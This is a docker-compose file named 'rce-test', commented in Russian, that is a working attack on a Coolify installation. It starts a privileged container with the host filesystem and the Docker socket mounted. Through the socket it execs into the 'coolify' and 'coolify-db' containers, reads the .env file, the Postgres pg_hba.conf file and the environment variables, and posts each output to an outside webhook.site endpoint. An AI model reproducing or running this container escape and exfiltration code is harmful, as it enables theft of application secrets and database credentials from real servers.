version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Создаём exec instance внутри контейнера coolify
        EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
          -X POST \
          -H "Content-Type: application/json" \
          -d '{"AttachStdout": true, "Cmd": ["cat", "/var/www/html/.env"]}' \
          http://localhost/containers/coolify/exec | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        echo "Exec ID: $EXEC_ID"
        
        # 2. Запускаем exec и получаем вывод
        if [ -n "$EXEC_ID" ]; then
          curl -s --unix-socket /var/run/docker.sock \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"Detach": false, "Tty": false}' \
            "http://localhost/exec/$EXEC_ID/start" | \
            curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_env_file
        fi
        
        # 3. То же самое для контейнера coolify-db (получить пароли напрямую из процесса)
        DB_EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
          -X POST \
          -H "Content-Type: application/json" \
          -d '{"AttachStdout": true, "Cmd": ["sh", "-c", "cat /var/lib/postgresql/data/pg_hba.conf; echo ---; env"]}' \
          http://localhost/containers/coolify-db/exec | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        if [ -n "$DB_EXEC_ID" ]; then
          curl -s --unix-socket /var/run/docker.sock \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"Detach": false, "Tty": false}' \
            "http://localhost/exec/$DB_EXEC_ID/start" | \
            curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=db_exec_output
        fi
        
        sleep 3600
